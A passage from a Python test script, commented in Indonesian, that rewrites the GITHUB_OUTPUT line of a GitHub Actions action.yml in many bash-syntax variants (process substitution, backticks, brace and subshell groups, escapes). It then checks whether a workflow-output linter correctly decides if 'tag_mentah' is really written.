        rc, out = jalan(proses, [sys.executable, GERBANG, "--semua"])
        periksa("substitusi proses bukan produsen: gerbang gagal (Audit 901)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(proses, ignore_errors=True)

        proekor = klon(tmp, "proekor")
        berkas_aksi29 = os.path.join(
            proekor, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi29, encoding="utf-8") as f:
            isi_aksi29 = f.read()
        baris_tulis29 = [b for b in isi_aksi29.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru29 = isi_aksi29.replace(
                baris_tulis29,
                baris_tulis29 + " >(cat > /dev/null)", 1)
        assert isi_baru29 != isi_aksi29, \
            "suntikan aksi29 tidak menembak"
        with open(berkas_aksi29, "w", encoding="utf-8") as f:
            f.write(isi_baru29)
        rc, out = jalan(proekor, [sys.executable, GERBANG, "--semua"])
        periksa("substitusi proses ekor tak menimpa: gerbang lolos (Audit 902)",
                rc == 0)
        shutil.rmtree(proekor, ignore_errors=True)

        purba = klon(tmp, "purba")
        berkas_aksi30 = os.path.join(
            purba, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi30, encoding="utf-8") as f:
            isi_aksi30 = f.read()
        baris_tulis30 = [b for b in isi_aksi30.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru30 = isi_aksi30.replace(
                baris_tulis30,
                baris_tulis30.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '`true >> "$GITHUB_OUTPUT" `'), 1)
        assert isi_baru30 != isi_aksi30, \
            "suntikan aksi30 tidak menembak"
        with open(berkas_aksi30, "w", encoding="utf-8") as f:
            f.write(isi_baru30)
        rc, out = jalan(purba, [sys.executable, GERBANG, "--semua"])
        periksa("substitusi backtick bukan produsen: gerbang gagal (Audit 903)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(purba, ignore_errors=True)

        purbaekor = klon(tmp, "purbaekor")
        berkas_aksi31 = os.path.join(
            purbaekor, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi31, encoding="utf-8") as f:
            isi_aksi31 = f.read()
        baris_tulis31 = [b for b in isi_aksi31.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru31 = isi_aksi31.replace(
                baris_tulis31,
                baris_tulis31 + " `true > /dev/null`", 1)
        assert isi_baru31 != isi_aksi31, \
            "suntikan aksi31 tidak menembak"
        with open(berkas_aksi31, "w", encoding="utf-8") as f:
            f.write(isi_baru31)
        rc, out = jalan(purbaekor, [sys.executable, GERBANG, "--semua"])
        periksa("backtick ekor tak menimpa: gerbang lolos (Audit 904)",
                rc == 0)
        shutil.rmtree(purbaekor, ignore_errors=True)

        grupcacat = klon(tmp, "grupcacat")
        berkas_aksi32 = os.path.join(
            grupcacat, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi32, encoding="utf-8") as f:
            isi_aksi32 = f.read()
        baris_tulis32 = [b for b in isi_aksi32.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        indentasi32 = baris_tulis32[:len(baris_tulis32)
                                     - len(baris_tulis32.lstrip())]
        isi_baru32 = isi_aksi32.replace(
                baris_tulis32,
                indentasi32 + "{ " + baris_tulis32.strip() + " }", 1)
        assert isi_baru32 != isi_aksi32, \
            "suntikan aksi32 tidak menembak"
        with open(berkas_aksi32, "w", encoding="utf-8") as f:
            f.write(isi_baru32)
        rc, out = jalan(grupcacat, [sys.executable, GERBANG, "--semua"])
        periksa("grup tanpa titik-koma bukan produsen: gerbang gagal "
                "(Audit 905)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(grupcacat, ignore_errors=True)

        pecahsub = klon(tmp, "pecahsub")
        berkas_aksi33 = os.path.join(
            pecahsub, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi33, encoding="utf-8") as f:
            isi_aksi33 = f.read()
        baris_tulis33 = [b for b in isi_aksi33.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru33 = isi_aksi33.replace(
                baris_tulis33,
                baris_tulis33.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '`echo x; echo y` >> "$GITHUB_OUTPUT"'), 1)
        assert isi_baru33 != isi_aksi33, \
            "suntikan aksi33 tidak menembak"
        with open(berkas_aksi33, "w", encoding="utf-8") as f:
            f.write(isi_baru33)
        rc, out = jalan(pecahsub, [sys.executable, GERBANG, "--semua"])
        periksa("pemisah dalam substitusi tak memecah: gerbang lolos "
                "(Audit 906)", rc == 0)
        shutil.rmtree(pecahsub, ignore_errors=True)

        pagartikus = klon(tmp, "pagartikus")
        berkas_aksi34 = os.path.join(
            pagartikus, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi34, encoding="utf-8") as f:
            isi_aksi34 = f.read()
        baris_tulis34 = [b for b in isi_aksi34.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru34 = isi_aksi34.replace(
                baris_tulis34,
                baris_tulis34.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '`echo #` >> "$GITHUB_OUTPUT"'), 1)
        assert isi_baru34 != isi_aksi34, \
            "suntikan aksi34 tidak menembak"
        with open(berkas_aksi34, "w", encoding="utf-8") as f:
            f.write(isi_baru34)
        rc, out = jalan(pagartikus, [sys.executable, GERBANG, "--semua"])
        periksa("pagar dalam backtick bukan komentar: gerbang lolos "
                "(Audit 907)", rc == 0)
        shutil.rmtree(pagartikus, ignore_errors=True)

        luput = klon(tmp, "luput")
        berkas_aksi35 = os.path.join(
            luput, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi35, encoding="utf-8") as f:
            isi_aksi35 = f.read()
        baris_tulis35 = [b for b in isi_aksi35.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru35 = isi_aksi35.replace(
                baris_tulis35,
                baris_tulis35.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '\\` >> "$GITHUB_OUTPUT"'), 1)
        assert isi_baru35 != isi_aksi35, \
            "suntikan aksi35 tidak menembak"
        with open(berkas_aksi35, "w", encoding="utf-8") as f:
            f.write(isi_baru35)
        rc, out = jalan(luput, [sys.executable, GERBANG, "--semua"])
        periksa("backtick ter-escape literal: gerbang lolos (Audit 908)",
                rc == 0)
        shutil.rmtree(luput, ignore_errors=True)

        luputpanah = klon(tmp, "luputpanah")
        berkas_aksi36 = os.path.join(
            luputpanah, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi36, encoding="utf-8") as f:
            isi_aksi36 = f.read()
        baris_tulis36 = [b for b in isi_aksi36.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru36 = isi_aksi36.replace(
                baris_tulis36,
                baris_tulis36.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> /dev/null \\> "$GITHUB_OUTPUT"'), 1)
        assert isi_baru36 != isi_aksi36, \
            "suntikan aksi36 tidak menembak"
        with open(berkas_aksi36, "w", encoding="utf-8") as f:
            f.write(isi_baru36)
        rc, out = jalan(luputpanah, [sys.executable, GERBANG, "--semua"])
        periksa("panah ter-escape bukan penulisan: gerbang gagal "
                "(Audit 909)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(luputpanah, ignore_errors=True)

        tempelpro = klon(tmp, "tempelpro")
        berkas_aksi37 = os.path.join(
            tempelpro, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi37, encoding="utf-8") as f:
            isi_aksi37 = f.read()
        baris_tulis37 = [b for b in isi_aksi37.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru37 = isi_aksi37.replace(
                baris_tulis37,
                baris_tulis37.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '>>(cat >> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru37 != isi_aksi37, \
            "suntikan aksi37 tidak menembak"
        with open(berkas_aksi37, "w", encoding="utf-8") as f:
            f.write(isi_baru37)
        rc, out = jalan(tempelpro, [sys.executable, GERBANG, "--semua"])
        periksa("target subshell menempel bukan produsen: gerbang gagal "
                "(Audit 910)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(tempelpro, ignore_errors=True)

        jarakpro = klon(tmp, "jarakpro")
        berkas_aksi38 = os.path.join(
            jarakpro, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi38, encoding="utf-8") as f:
            isi_aksi38 = f.read()
        baris_tulis38 = [b for b in isi_aksi38.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru38 = isi_aksi38.replace(
                baris_tulis38,
                baris_tulis38.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cat >> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru38 != isi_aksi38, \
            "suntikan aksi38 tidak menembak"
        with open(berkas_aksi38, "w", encoding="utf-8") as f:
            f.write(isi_baru38)
        rc, out = jalan(jarakpro, [sys.executable, GERBANG, "--semua"])
        periksa("target substitusi proses berjarak produsen: gerbang "
                "lolos (Audit 911)", rc == 0)
        shutil.rmtree(jarakpro, ignore_errors=True)

        grupredir = klon(tmp, "grupredir")
        berkas_aksi39 = os.path.join(
            grupredir, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi39, encoding="utf-8") as f:
            isi_aksi39 = f.read()
        baris_tulis39 = [b for b in isi_aksi39.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        indentasi39 = baris_tulis39[:len(baris_tulis39)
                                    - len(baris_tulis39.lstrip())]
        inti39 = baris_tulis39.strip().replace(
            ' >> "$GITHUB_OUTPUT"', "")
        isi_baru39 = isi_aksi39.replace(
                baris_tulis39,
                indentasi39 + "{ " + inti39
                + "; } >> \"$GITHUB_OUTPUT\"", 1)
        assert isi_baru39 != isi_aksi39, \
            "suntikan aksi39 tidak menembak"
        with open(berkas_aksi39, "w", encoding="utf-8") as f:
            f.write(isi_baru39)
        rc, out = jalan(grupredir, [sys.executable, GERBANG, "--semua"])
        periksa("redirect tingkat grup produsen: gerbang lolos "
                "(Audit 912)", rc == 0)
        shutil.rmtree(grupredir, ignore_errors=True)

        kurungtempel = klon(tmp, "kurungtempel")
        berkas_aksi40 = os.path.join(
            kurungtempel, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi40, encoding="utf-8") as f:
            isi_aksi40 = f.read()
        baris_tulis40 = [b for b in isi_aksi40.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        indentasi40 = baris_tulis40[:len(baris_tulis40)
                                    - len(baris_tulis40.lstrip())]
        isi_baru40 = isi_aksi40.replace(
                baris_tulis40,
                indentasi40 + "{" + baris_tulis40.strip() + "; }", 1)
        assert isi_baru40 != isi_aksi40, \
            "suntikan aksi40 tidak menembak"
        with open(berkas_aksi40, "w", encoding="utf-8") as f:
            f.write(isi_baru40)
        rc, out = jalan(kurungtempel, [sys.executable, GERBANG, "--semua"])
        periksa("kurung menempel bukan grup: gerbang gagal (Audit 913)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(kurungtempel, ignore_errors=True)

        grupsendiri = klon(tmp, "grupsendiri")
        berkas_aksi41 = os.path.join(
            grupsendiri, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi41, encoding="utf-8") as f:
            isi_aksi41 = f.read()
        baris_tulis41 = [b for b in isi_aksi41.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        indentasi41 = baris_tulis41[:len(baris_tulis41)
                                    - len(baris_tulis41.lstrip())]
        inti41 = baris_tulis41.strip().replace(
            '>> "$GITHUB_OUTPUT"', '> /dev/null')
        isi_baru41 = isi_aksi41.replace(
                baris_tulis41,
                indentasi41 + "{ " + inti41
                + "; } >> \"$GITHUB_OUTPUT\"", 1)
        assert isi_baru41 != isi_aksi41, \
            "suntikan aksi41 tidak menembak"
        with open(berkas_aksi41, "w", encoding="utf-8") as f:
            f.write(isi_baru41)
        rc, out = jalan(grupsendiri, [sys.executable, GERBANG, "--semua"])
        periksa("echo grup ber-redirect sendiri bukan kandidat: gerbang "
                "gagal (Audit 914)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(grupsendiri, ignore_errors=True)

        kulitredir = klon(tmp, "kulitredir")
        berkas_aksi42 = os.path.join(
            kulitredir, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi42, encoding="utf-8") as f:
            isi_aksi42 = f.read()
        baris_tulis42 = [b for b in isi_aksi42.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        indentasi42 = baris_tulis42[:len(baris_tulis42)
                                    - len(baris_tulis42.lstrip())]
        inti42 = baris_tulis42.strip().replace(
            ' >> "$GITHUB_OUTPUT"', "")
        isi_baru42 = isi_aksi42.replace(
                baris_tulis42,
                indentasi42 + "( " + inti42
                + "; ) >> \"$GITHUB_OUTPUT\"", 1)
        assert isi_baru42 != isi_aksi42, \
            "suntikan aksi42 tidak menembak"
        with open(berkas_aksi42, "w", encoding="utf-8") as f:
            f.write(isi_baru42)
        rc, out = jalan(kulitredir, [sys.executable, GERBANG, "--semua"])
        periksa("redirect tingkat subshell produsen: gerbang lolos "
                "(Audit 915)", rc == 0)
        shutil.rmtree(kulitredir, ignore_errors=True)

        proseimbang = klon(tmp, "proseimbang")
        berkas_aksi43 = os.path.join(
            proseimbang, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi43, encoding="utf-8") as f:
            isi_aksi43 = f.read()
        baris_tulis43 = [b for b in isi_aksi43.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru43 = isi_aksi43.replace(
                baris_tulis43,
                baris_tulis43.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cat >> "$GITHUB_OUTPUT"'), 1)
        assert isi_baru43 != isi_aksi43, \
            "suntikan aksi43 tidak menembak"
        with open(berkas_aksi43, "w", encoding="utf-8") as f:
            f.write(isi_baru43)
        rc, out = jalan(proseimbang, [sys.executable, GERBANG, "--semua"])
        periksa("target substitusi tak seimbang bukan produsen: gerbang "
                "gagal (Audit 916)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(proseimbang, ignore_errors=True)

        prosisa = klon(tmp, "prosisa")
        berkas_aksi44 = os.path.join(
            prosisa, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi44, encoding="utf-8") as f:
            isi_aksi44 = f.read()
        baris_tulis44 = [b for b in isi_aksi44.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru44 = isi_aksi44.replace(
                baris_tulis44,
                baris_tulis44.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cat > /tmp/lain) >> "$GITHUB_OUTPUT"'), 1)
        assert isi_baru44 != isi_aksi44, \
            "suntikan aksi44 tidak menembak"
        with open(berkas_aksi44, "w", encoding="utf-8") as f:
            f.write(isi_baru44)
        rc, out = jalan(prosisa, [sys.executable, GERBANG, "--semua"])
        periksa("redirect sah sesudah target substitusi: gerbang lolos "
                "(Audit 917)", rc == 0)
        shutil.rmtree(prosisa, ignore_errors=True)

        potongluput = klon(tmp, "potongluput")
        berkas_aksi45 = os.path.join(
            potongluput, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi45, encoding="utf-8") as f:
            isi_aksi45 = f.read()
        baris_tulis45 = [b for b in isi_aksi45.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru45 = isi_aksi45.replace(
                baris_tulis45,
                baris_tulis45.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '\\` >> "$GITHUB_OUTPUT" # dulu > /tmp/lain'), 1)
        assert isi_baru45 != isi_aksi45, \
            "suntikan aksi45 tidak menembak"
        with open(berkas_aksi45, "w", encoding="utf-8") as f:
            f.write(isi_baru45)
        rc, out = jalan(potongluput, [sys.executable, GERBANG, "--semua"])
        periksa("komentar sesudah backtick literal terpotong: gerbang "
                "lolos (Audit 918)", rc == 0)
        shutil.rmtree(potongluput, ignore_errors=True)

        parameter = klon(tmp, "parameter")
        berkas_aksi46 = os.path.join(
            parameter, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi46, encoding="utf-8") as f:
            isi_aksi46 = f.read()
        baris_tulis46 = [b for b in isi_aksi46.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru46 = isi_aksi46.replace(
                baris_tulis46,
                baris_tulis46.replace(
                    'echo "tag_mentah=$TAG"',
                    '{ echo "tag_mentah=$TAG" ${x:-a>b}; }'), 1)
        assert isi_baru46 != isi_aksi46, \
            "suntikan aksi46 tidak menembak"
        with open(berkas_aksi46, "w", encoding="utf-8") as f:
            f.write(isi_baru46)
        rc, out = jalan(parameter, [sys.executable, GERBANG, "--semua"])
        periksa("panah di nilai bawaan ekspansi tak menyaring kandidat: "
                "gerbang lolos (Audit 919)", rc == 0)
        shutil.rmtree(parameter, ignore_errors=True)

        sarang = klon(tmp, "sarang")
        berkas_aksi47 = os.path.join(
            sarang, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi47, encoding="utf-8") as f:
            isi_aksi47 = f.read()
        baris_tulis47 = [b for b in isi_aksi47.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru47 = isi_aksi47.replace(
                baris_tulis47,
                '        run: |\n'
                '          TAG="v1"\n'
                '          { ( echo "tag_mentah=$TAG"; ) > /dev/null; } '
                '>> "$GITHUB_OUTPUT"\n', 1)
        assert isi_baru47 != isi_aksi47, \
            "suntikan aksi47 tidak menembak"
        with open(berkas_aksi47, "w", encoding="utf-8") as f:
            f.write(isi_baru47)
        rc, out = jalan(sarang, [sys.executable, GERBANG, "--semua"])
        periksa("redirect dalam mengalahkan kredit luar: gerbang gagal "
                "(Audit 920)", rc != 0)
        shutil.rmtree(sarang, ignore_errors=True)

        sarangbalik = klon(tmp, "sarangbalik")
        berkas_aksi48 = os.path.join(
            sarangbalik, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi48, encoding="utf-8") as f:
            isi_aksi48 = f.read()
        # Audit 1440: jarum lama skenario ini (blok run:
        # versi awal action) sudah tak ada di action.yml
        # sehingga suntikannya tak pernah menembak dan
        # skenario diam-diam menguji pohon bersih. Jarum
        # kini baris tag_mentah yang hidup, diganti
        # susunan Audit 921 yang persis: redirect
        # subshell-DALAM ke $GITHUB_OUTPUT mengesahkan
        # tulisan walau grup luarnya ke /dev/null (bentuk
        # sebaliknya — dalam /dev/null, luar output —
        # milik Audit 920 dan wajib GAGAL).
        isi_baru48 = isi_aksi48.replace(
                '        echo "tag_mentah=$TAG" >> "$GITHUB_OUTPUT"\n',
                '        { ( echo "tag_mentah=$TAG"; ) '
                '>> "$GITHUB_OUTPUT"; } > /dev/null\n', 1)
        assert isi_baru48 != isi_aksi48, \
            "suntikan aksi48 tidak menembak"
        with open(berkas_aksi48, "w", encoding="utf-8") as f:
            f.write(isi_baru48)
        rc, out = jalan(sarangbalik, [sys.executable, GERBANG, "--semua"])
        periksa("redirect subshell-dalam mengesahkan kandidat: gerbang "
                "lolos (Audit 921)", rc == 0)
        shutil.rmtree(sarangbalik, ignore_errors=True)

        kurungutip = klon(tmp, "kurungutip")
        berkas_aksi49 = os.path.join(
            kurungutip, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi49, encoding="utf-8") as f:
            isi_aksi49 = f.read()
        baris_tulis49 = [b for b in isi_aksi49.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru49 = isi_aksi49.replace(
                baris_tulis49,
                baris_tulis49.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(echo "("; cat >> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru49 != isi_aksi49, \
            "suntikan aksi49 tidak menembak"
        with open(berkas_aksi49, "w", encoding="utf-8") as f:
            f.write(isi_baru49)
        rc, out = jalan(kurungutip, [sys.executable, GERBANG, "--semua"])
        periksa("kurung berkutip di target substitusi tak membatalkan "
                "vonis: gerbang lolos (Audit 922)", rc == 0)
        shutil.rmtree(kurungutip, ignore_errors=True)

        pagarkata = klon(tmp, "pagarkata")
        berkas_aksi50 = os.path.join(
            pagarkata, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi50, encoding="utf-8") as f:
            isi_aksi50 = f.read()
        baris_tulis50 = [b for b in isi_aksi50.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru50 = isi_aksi50.replace(
                baris_tulis50,
                baris_tulis50.replace(
                    'echo "tag_mentah=$TAG"',
                    'echo "tag_mentah=$TAG" x\\ #'), 1)
        assert isi_baru50 != isi_aksi50, \
            "suntikan aksi50 tidak menembak"
        with open(berkas_aksi50, "w", encoding="utf-8") as f:
            f.write(isi_baru50)
        rc, out = jalan(pagarkata, [sys.executable, GERBANG, "--semua"])
        periksa("pagar tengah kata sesudah spasi ter-escape bukan "
                "komentar: gerbang lolos (Audit 923)", rc == 0)
        shutil.rmtree(pagarkata, ignore_errors=True)

        grupgeser = klon(tmp, "grupgeser")
        berkas_aksi51 = os.path.join(
            grupgeser, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi51, encoding="utf-8") as f:
            isi_aksi51 = f.read()
        baris_tulis51 = [b for b in isi_aksi51.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru51 = isi_aksi51.replace(
                baris_tulis51,
                baris_tulis51.replace(
                    'echo "tag_mentah=$TAG"',
                    '{ echo "tag_mentah=$TAG" }'), 1)
        assert isi_baru51 != isi_aksi51, \
            "suntikan aksi51 tidak menembak"
        with open(berkas_aksi51, "w", encoding="utf-8") as f:
            f.write(isi_baru51)
        rc, out = jalan(grupgeser, [sys.executable, GERBANG, "--semua"])
        periksa("grup tak sah bergeser redirect tetap ditolak: gerbang "
                "gagal (Audit 924)", rc != 0)
        shutil.rmtree(grupgeser, ignore_errors=True)

        paramsub = klon(tmp, "paramsub")
        berkas_aksi52 = os.path.join(
            paramsub, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi52, encoding="utf-8") as f:
            isi_aksi52 = f.read()
        baris_tulis52 = [b for b in isi_aksi52.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru52 = isi_aksi52.replace(
                baris_tulis52,
                baris_tulis52.replace(
                    'echo "tag_mentah=$TAG"',
                    '{ echo "tag_mentah=$TAG" ${x:-$(echo })>y}; }'), 1)
        assert isi_baru52 != isi_aksi52, \
            "suntikan aksi52 tidak menembak"
        with open(berkas_aksi52, "w", encoding="utf-8") as f:
            f.write(isi_baru52)
        rc, out = jalan(paramsub, [sys.executable, GERBANG, "--semua"])
        periksa("kurung isi substitusi tak menutup ekspansi: gerbang "
                "lolos (Audit 925)", rc == 0)
        shutil.rmtree(paramsub, ignore_errors=True)

        aritmetika = klon(tmp, "aritmetika")
        berkas_aksi53 = os.path.join(
            aritmetika, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi53, encoding="utf-8") as f:
            isi_aksi53 = f.read()
        baris_tulis53 = [b for b in isi_aksi53.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru53 = isi_aksi53.replace(
                baris_tulis53,
                baris_tulis53.replace(
                    'echo "tag_mentah=$TAG"',
                    '{ (( 1 > 0 )); echo "tag_mentah=$TAG"; }'), 1)
        assert isi_baru53 != isi_aksi53, \
            "suntikan aksi53 tidak menembak"
        with open(berkas_aksi53, "w", encoding="utf-8") as f:
            f.write(isi_baru53)
        rc, out = jalan(aritmetika, [sys.executable, GERBANG, "--semua"])
        periksa("operator aritmetika bukan subshell gadungan: gerbang "
                "lolos (Audit 926)", rc == 0)
        shutil.rmtree(aritmetika, ignore_errors=True)

        kurungluput = klon(tmp, "kurungluput")
        berkas_aksi54 = os.path.join(
            kurungluput, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi54, encoding="utf-8") as f:
            isi_aksi54 = f.read()
        baris_tulis54 = [b for b in isi_aksi54.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru54 = isi_aksi54.replace(
                baris_tulis54,
                baris_tulis54.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(echo \\(; cat >> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru54 != isi_aksi54, \
            "suntikan aksi54 tidak menembak"
        with open(berkas_aksi54, "w", encoding="utf-8") as f:
            f.write(isi_baru54)
        rc, out = jalan(kurungluput, [sys.executable, GERBANG, "--semua"])
        periksa("kurung ter-escape di target substitusi tak membatalkan "
                "vonis: gerbang lolos (Audit 927)", rc == 0)
        shutil.rmtree(kurungluput, ignore_errors=True)

        polakutip = klon(tmp, "polakutip")
        berkas_aksi55 = os.path.join(
            polakutip, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi55, encoding="utf-8") as f:
            isi_aksi55 = f.read()
        baris_tulis55 = [b for b in isi_aksi55.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru55 = isi_aksi55.replace(
                baris_tulis55,
                baris_tulis55.replace(
                    'echo "tag_mentah=$TAG"',
                    '{ echo "tag_mentah=$TAG } >> x"; }'), 1)
        assert isi_baru55 != isi_aksi55, \
            "suntikan aksi55 tidak menembak"
        with open(berkas_aksi55, "w", encoding="utf-8") as f:
            f.write(isi_baru55)
        rc, out = jalan(polakutip, [sys.executable, GERBANG, "--semua"])
        periksa("pola kurung di dalam string argumen bukan kurung "
                "argumen: gerbang lolos (Audit 928)", rc == 0)
        shutil.rmtree(polakutip, ignore_errors=True)

        grupgeser2 = klon(tmp, "grupgeser2")
        berkas_aksi56 = os.path.join(
            grupgeser2, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi56, encoding="utf-8") as f:
            isi_aksi56 = f.read()
        baris_tulis56 = [b for b in isi_aksi56.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru56 = isi_aksi56.replace(
                baris_tulis56,
                baris_tulis56.replace(
                    'echo "tag_mentah=$TAG" >> "$GITHUB_OUTPUT"',
                    '{ echo "tag_mentah=$TAG" } | cat '
                    '>> "$GITHUB_OUTPUT"'), 1)
        assert isi_baru56 != isi_aksi56, \
            "suntikan aksi56 tidak menembak"
        with open(berkas_aksi56, "w", encoding="utf-8") as f:
            f.write(isi_baru56)
        rc, out = jalan(grupgeser2, [sys.executable, GERBANG, "--semua"])
        periksa("grup tak sah bergeser pipa tetap ditolak: gerbang "
                "gagal (Audit 929)", rc != 0)
        shutil.rmtree(grupgeser2, ignore_errors=True)

        hitung = klon(tmp, "hitung")
        berkas_aksi57 = os.path.join(
            hitung, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi57, encoding="utf-8") as f:
            isi_aksi57 = f.read()
        baris_tulis57 = [b for b in isi_aksi57.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru57 = isi_aksi57.replace(
                baris_tulis57,
                baris_tulis57.replace(
                    'echo "tag_mentah=$TAG"',
                    '(( echo "tag_mentah=$TAG"))'), 1)
        assert isi_baru57 != isi_aksi57, \
            "suntikan aksi57 tidak menembak"
        with open(berkas_aksi57, "w", encoding="utf-8") as f:
            f.write(isi_baru57)
        rc, out = jalan(hitung, [sys.executable, GERBANG, "--semua"])
        periksa("teks mirip echo di dalam aritmetika tak terkredit: "
                "gerbang gagal (Audit 930)", rc != 0)
        shutil.rmtree(hitung, ignore_errors=True)

        subbanyak = klon(tmp, "subbanyak")
        berkas_aksi58 = os.path.join(
            subbanyak, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi58, encoding="utf-8") as f:
            isi_aksi58 = f.read()
        baris_tulis58 = [b for b in isi_aksi58.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru58 = isi_aksi58.replace(
                baris_tulis58,
                baris_tulis58.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cat >> "$GITHUB_OUTPUT"; echo x '
                    '> /dev/null)'), 1)
        assert isi_baru58 != isi_aksi58, \
            "suntikan aksi58 tidak menembak"
        with open(berkas_aksi58, "w", encoding="utf-8") as f:
            f.write(isi_baru58)
        rc, out = jalan(subbanyak, [sys.executable, GERBANG, "--semua"])
        periksa("penulis pertama isi substitusi yang berlaku: gerbang "
                "lolos (Audit 931)", rc == 0)
        shutil.rmtree(subbanyak, ignore_errors=True)

        subkuras = klon(tmp, "subkuras")
        berkas_aksi59 = os.path.join(
            subkuras, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi59, encoding="utf-8") as f:
            isi_aksi59 = f.read()
        baris_tulis59 = [b for b in isi_aksi59.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru59 = isi_aksi59.replace(
                baris_tulis59,
                baris_tulis59.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cat > /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru59 != isi_aksi59, \
            "suntikan aksi59 tidak menembak"
